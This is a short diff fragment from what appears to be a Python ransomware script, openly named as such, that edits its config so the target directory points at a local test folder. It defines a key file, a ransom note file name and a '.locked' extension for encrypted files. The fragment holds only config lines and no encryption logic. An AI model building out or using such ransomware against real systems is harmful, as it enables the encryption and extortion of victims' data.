@@ -3,7 +3,7 @@ from cryptography.fernet import Fernet
 import hashlib
 
 # ── CONFIG ─────────────────────────────────────────────
-TARGET_DIR        = r"Ransomwares\Test Folder\Test"
+TARGET_DIR        = r"/home/hunter/Documents/tools/RANSOMWARE-FUMES/Test Folder/Test/"
 KEY_FILE          = "key.txt"
 NOTE_FILENAME     = "READ_ME.html"
 LOCKED_EXTENSION  = ".locked"
